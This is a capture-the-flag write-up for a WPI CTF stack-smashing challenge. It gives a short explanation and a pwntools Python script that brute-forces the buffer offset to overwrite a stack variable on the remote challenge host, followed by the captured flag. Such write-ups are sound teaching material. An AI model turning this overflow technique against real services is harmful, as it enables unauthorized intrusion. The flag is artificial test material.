# $m4$h

Simple stack smashing challenge

Connect on nc smash184384.wpictf.xyz 15724.

Press enter once after connecting

Author: Iv

## Challenge

We're given source code for a simple binary vulnerable to a buffer overflow attack.
There is a variable on the stack which, if set to the correct number, will make the program print the flag.

## Solution

We can overflow the buffer and overwrite the stack variable with the desired value to print the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host smash184384.wpictf.xyz --port 15724
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'smash184384.wpictf.xyz'
port = int(args.PORT or 15724)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

i = 0

while True:
    io = start()

    print(i)
    payload = flat({
        i: 923992130,
        })

    print(payload)
    io.sendline(payload)
    
    res = io.recvline()
    print(res)
    if b'very normal' not in res:
        break

    io.close()
    i += 1

io.interactive()
```

## Flag

`WPI{ju5t!n|$bR#4tht4k!n6}`

